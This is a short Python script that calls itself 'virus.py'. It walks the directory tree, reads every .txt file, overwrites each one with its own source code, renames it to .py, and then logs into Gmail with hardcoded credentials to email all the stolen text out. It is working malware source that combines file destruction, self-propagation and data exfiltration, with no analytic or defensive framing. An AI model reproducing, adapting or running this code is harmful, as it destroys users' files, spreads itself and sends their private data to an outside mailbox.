from os import walk
import smtplib
from os.path import splitext
import os, sys

reading_arr = []

for ddir, subdir, files in walk('.'):
	for f_file in files:
		pyread = open("virus.py", "r")
		pyread_contents = pyread.readlines()
		if f_file.endswith('.txt'):
			#reading_arr = [] # uncomment if need to send one email per one text file
			file_path = ddir+ '/'+f_file #gets the path to each files
			fileread = open(file_path, "r") # reads the content of each file in different subdirectories and stores them in variable fileread as a list
			reading_arr+=fileread.readlines()

			

			########## every file contents are sent individual emails
			#reading_arr =fileread.readlines() #concats so obtained list and make and make a single list
			# email_msg = ''.join(reading_arr) # converts list into string and stores it in the variable email_msg
			# server = smtplib.SMTP('smtp.gmail.com', 587)
			# server.ehlo()
			# server.starttls()
			# server.ehlo()
			#server.login("injit.ptacc@gmail.com", "T3st1ng999")
			#server.sendmail("injit.ptacc@gmail.com", "injit.ptacc@gmail.com", email_msg)
			
			##############
			fileread.close()
			
			txtwrite = open(file_path, "w")
			txtwrite.writelines(pyread_contents)
			(root, ext) = splitext(file_path)
			os.rename(file_path, root+ ".py")
			txtwrite.close()

#for the shake of easiness this converts all .py extention to .txt extention except out virus.py
#this chunk of code is not needed
		# if f_file.endswith('.py') and f_file != 'virus.py':
		# 	file_path = ddir+ '/'+f_file #gets the path to each files
		# 	(root, ext) = splitext(file_path)
		# 	os.rename(file_path, root+ ".txt")

################## to send all content as one file, we need to uncomment the global empty list on the top and uncomment the inner one inside if
email_msg = ''.join(reading_arr) # converts list into string and stores it in the variable email_msg
server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.ehlo()
server.login("injit.ptacc@gmail.com", "T3st1ng999")
server.sendmail("injit.ptacc@gmail.com", "injit.ptacc@gmail.com", email_msg)


